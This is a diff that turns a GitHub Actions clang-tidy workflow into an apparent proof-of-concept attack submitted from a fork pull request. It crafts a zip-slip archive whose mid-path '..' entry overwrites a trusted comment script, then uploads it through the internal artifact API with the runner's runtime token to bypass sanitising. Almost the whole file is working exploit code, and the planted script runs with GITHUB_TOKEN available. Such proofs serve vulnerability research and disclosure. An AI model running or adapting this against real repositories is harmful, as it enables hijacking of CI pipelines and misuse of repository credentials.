@@ -1,26 +1,103 @@
+# Attacker-supplied workflow, added in a FORK PR.
+# name: must match the victim's `workflow_run: workflows: [...]` trigger.
 name: clang-tidy
 on:
-  push:
   pull_request:
 
 permissions: {}
 
 jobs:
-  clang-tidy:
-    if: github.repository_owner == 'echowhoami'
+  poison:
     runs-on: ubuntu-latest
     steps:
-      - uses: actions/checkout@v4
-      - name: Run clang-tidy (benign stand-in)
+      - name: Craft poisoned zip (mid-path traversal entry)
+        env:
+          PR: ${{ github.event.pull_request.number }}
         run: |
-          echo "no issues found" > clang-tidy-comment.md
-          echo "${{ github.event.pull_request.number }}" > pr_number.txt
-      - name: Upload clang-tidy results
-        if: always()
-        uses: actions/upload-artifact@v4
+          python3 - <<'PY'
+          import os, zipfile
+          pr = os.environ['PR']
+          payload = '''module.exports = async function({github, context, core, prNumber, body, marker}) {
+            core.info('==================================================');
+            core.info(' ZIP-SLIP BYPASS PROVEN');
+            core.info(' Attacker-supplied JS is executing inside');
+            core.info(' actions/github-script, after escaping _artifact/');
+            core.info(' GITHUB_TOKEN in env: ' + Boolean(process.env.GITHUB_TOKEN));
+            core.info('==================================================');
+            await github.rest.issues.createComment({
+              owner: context.repo.owner,
+              repo: context.repo.repo,
+              issue_number: prNumber,
+              body: marker + '\\n**PoC:** this comment was posted by *attacker-supplied code*. '
+                + 'A mid-path `..` zip entry escaped the `path: _artifact` hardening and '
+                + 'overwrote the trusted `.github/scripts/post-pr-comment.js`.'
+            });
+          };
+          '''
+          z = zipfile.ZipFile('/tmp/poison.zip', 'w', zipfile.ZIP_DEFLATED)
+          # leading ../ is stripped by unzip-stream 0.3.1, but MID-PATH .. is not
+          z.writestr(zipfile.ZipInfo('a/../../.github/scripts/post-pr-comment.js'), payload)
+          z.writestr('clang-tidy-comment.md', 'poc')
+          z.writestr('pr_number.txt', pr + '\n')
+          z.close()
+          print('entries:', zipfile.ZipFile('/tmp/poison.zip').namelist())
+          PY
+
+      - name: Upload raw zip via the artifact API (bypasses upload-artifact sanitising)
+        uses: actions/github-script@v7
         with:
-          name: clang-tidy-result
-          path: |
-            clang-tidy-comment.md
-            pr_number.txt
-          if-no-files-found: ignore
+          script: |
+            const fs = require('fs');
+            const rt  = process.env.ACTIONS_RUNTIME_TOKEN;
+            const base = process.env.ACTIONS_RESULTS_URL;
+            if (!rt || !base) {
+              core.setFailed(`missing runtime env: token=${!!rt} url=${!!base}`);
+              return;
+            }
+            const claims = JSON.parse(
+              Buffer.from(rt.split('.')[1], 'base64').toString());
+            const scp = [].concat(claims.scp).join(' ');
+            const m = /Actions\.Results:([^:\s]+):([^:\s]+)/.exec(scp);
+            const [, runBackendId, jobBackendId] = m;
+            core.info(`backend ids: ${runBackendId} / ${jobBackendId}`);
+
+            const twirp = async (method, body) => {
+              const r = await fetch(
+                `${base}twirp/github.actions.results.api.v1.ArtifactService/${method}`,
+                { method: 'POST',
+                  headers: { 'Authorization': `Bearer ${rt}`,
+                             'Content-Type': 'application/json' },
+                  body: JSON.stringify(body) });
+              const t = await r.text();
+              core.info(`${method} -> ${r.status} ${t}`);
+              if (!r.ok) throw new Error(`${method} failed`);
+              return JSON.parse(t);
+            };
+
+            const name = 'clang-tidy-result';
+            const created = await twirp('CreateArtifact', {
+              workflow_run_backend_id: runBackendId,
+              workflow_job_run_backend_id: jobBackendId,
+              name, version: 4 });
+
+            const zip = fs.readFileSync('/tmp/poison.zip');
+            const put = await fetch(created.signed_upload_url + '&comp=block&blockid=' +
+                Buffer.from('block1').toString('base64'), {
+              method: 'PUT',
+              headers: { 'x-ms-blob-type': 'BlockBlob', 'Content-Length': String(zip.length) },
+              body: zip });
+            core.info(`block PUT -> ${put.status}`);
+
+            const list = `<?xml version="1.0" encoding="utf-8"?><BlockList><Latest>${
+                Buffer.from('block1').toString('base64')}</Latest></BlockList>`;
+            const commit = await fetch(created.signed_upload_url + '&comp=blocklist', {
+              method: 'PUT',
+              headers: { 'Content-Type': 'application/xml' },
+              body: list });
+            core.info(`blocklist PUT -> ${commit.status}`);
+
+            await twirp('FinalizeArtifact', {
+              workflow_run_backend_id: runBackendId,
+              workflow_job_run_backend_id: jobBackendId,
+              name, size: String(zip.length) });
+            core.info('artifact finalized');
